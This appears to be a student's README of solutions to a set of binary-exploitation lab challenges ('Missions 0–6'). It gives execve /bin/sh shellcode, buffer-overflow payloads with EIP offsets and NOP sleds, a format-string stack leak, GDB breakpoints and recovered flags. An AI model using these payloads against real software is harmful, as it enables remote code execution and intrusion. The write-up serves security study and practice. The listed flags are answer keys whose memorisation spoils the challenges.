# CS challenges
Shellcode: `\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh`
## Mission 0
---
Solve with buffer overflow and EIP to function.

- target EIP address: 0xffffc57c
- target buffer address: 0xffffc4b8
- offset: 0xffffc57c - 0xffffc4b8 = 196
- target function addr: 0x080485cb

exploit: ```echo "`python -c 'print "a"*196 + "\xcb\x85\x04\x08"'`" | ./mission0```

GDB:
```r <<< $(python -c "print('a'*196 + '\xcb\x85\x04\x08')")```

## Mission 1
---
Solve with buffer overflow and shellcode.

- target EIP address: 0xffffc59c
- target buffer address: 0xffffc48b
- offset: 0xffffc59c - 0xffffc48b = 273 (+ 4)

exploit: ```(python -c 'print "\x90"*206 + "\x1f\xeb\x89\x5e\x08\x76\xc0\x31\x46\x88\x89\x07\x0c\x46\x0b\xb0\xf3\x89\x4e\x8d\x8d\x08\x0c\x56\x80\xcd\xdb\x31\xd8\x89\xcd\x40\xe8\x80\xff\xdc\xff\xffb/nis/hh" + "\x90"*21 + "\xab\xc4\xff\xff"'; cat -) | ./mission1```

GDB:
```r <<< $(python -c "print('\x90'*206 + '\x1f\xeb\x89\x5e\x08\x76\xc0\x31\x46\x88\x89\x07\x0c\x46\x0b\xb0\xf3\x89\x4e\x8d\x8d\x08\x0c\x56\x80\xcd\xdb\x31\xd8\x89\xcd\x40\xe8\x80\xff\xdc\xff\xff' + 'b/nis/hh' + '\x90'*21 + '\xab\xc4\xff\xff')")```

## Mission 2
---
Solve with format string by printing out the stack (info leakage).

Do the following, inside the mission2 directory:
```
sh ./writable/exploit.sh
cat ./writable/test.txt | ./mission2 > ./writable/output.txt
nano ./writable/output.txt # check the stack for the flag
```
Flag on the stack, need to be reversed: "6c6364527a786e6d45585971684d6a5a6746757a"

Python script:
```
flag = bytearray.fromhex("6c6364527a786e6d45585971684d6a5a6746757a").decode()[::-1]
```
Flag: `zuFgZjMhqYXEmnxzRdcl`

## Mission 3
---
Exploit condition edge cases, input the following values:
```
# Overwrite admin to 1
Enter the size of your wish list > 1
Insert your choice > 2
Slot to fill > 0
Gift number > 1
---
```

- Target EIP addr: 0xffffc56c <- 0x080488d2
- admin_message EBP addr: 0xffffc568
- Buffer addr: ebp - 0x40 + 4 (offset from size) = 0xffffc52c
- offset: 0xffffc56c - 0xffffc52c = 64 (= 48 + 16)

(r <<< $(python -c "print('1\n2\n0\n1\n4\n-1\n'+''*100+'\n5')"))

GDB:
- b *0x080485e7 - break at push ebp
- b *0x08048676 - break after getc
- r <<< $(python -c "print('1\n2\n0\n1\n4\n-1\n'+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh3333'+'\x90'*12 +'\x2c'+'\xc5\xff\xff'+'\n')")
- display/20wx 0xffffc52c (display buffer)
  
Actual buffer addr: 0xffffc54c

Flag: `PlbAQoKqSYOTyimtEusG`
## Mission 4
---
Solve by decompiling the binary code using ghidra.

Do the following, inside the mission2 directory:
```
python3 activation_key.py # outputs aTm5ZFzg-qs6bf9SW-b5qxZUMj
./mission4 
# input: aTm5ZFzg-qs6bf9SW-b5qxZUMj
```

Flag: `nYGGALvqgEIsGjRJHIci`



## Misison 6
---
Idea: use main return EIP to jump to a place in memory; use heap to overflow.

- Target EIP: 0xffffc57c (-10 offset wrt ./mission5/mission5)
- Buffer ESP: 0xffffc5a8 (EBP) - 0x24d = 0xffffc32b (-10 offset wrt ./mission5/mission5)

- 0xffffc57c (Main's target EIP) - 0xffffc32b = 593

(python -c "print(b'\x90'*548 + b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + b'\x2b\xc4\xff\xff')") > motd.txt
 
- b *0x08048743
- display/wx 0xffffc33b
- display/20wx 0x804b818


